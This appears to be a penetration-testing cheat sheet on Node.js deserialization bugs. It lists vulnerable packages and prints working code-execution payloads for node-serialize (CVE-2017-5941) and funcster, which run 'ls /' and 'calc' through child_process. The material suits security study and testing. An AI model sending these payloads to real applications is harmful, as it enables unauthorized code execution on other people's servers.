# Node Deserialization

> Node.js deserialization refers to the process of reconstructing JavaScript objects from a serialized format, such as JSON, BSON, or other formats that represent structured data. In Node.js applications, serialization and deserialization are commonly used for data storage, caching, and inter-process communication.


## Summary

* [Methodology](#methodology)
    * [node-serialize](#node-serialize)
    * [funcster](#funcster)
* [References](#references)


## Methodology

* In Node source code, look for:

    * `node-serialize`
    * `serialize-to-js`
    * `funcster`


### node-serialize

> An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the `unserialize()` function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).

1. Generate a serialized payload
    ```js
    var y = {
        rce : function(){
            require('child_process').exec('ls /', function(error,
            stdout, stderr) { console.log(stdout) });
        },
    }
    var serialize = require('node-serialize');
    console.log("Serialized: \n" + serialize.serialize(y));
    ```
2. Add bracket `()` to force the execution
    ```js
    {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
    ```
3. Send the payload


### funcster

```js
{"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}
```


## References

- [CVE-2017-5941 - National Vulnerability Database - February 9, 2017](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)
- [Exploiting Node.js deserialization bug for Remote Code Execution (CVE-2017-5941) - Ajin Abraham - October 31, 2018](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)
- [NodeJS Deserialization - gonczor - January 8, 2020](https://blacksheephacks.pl/nodejs-deserialization/)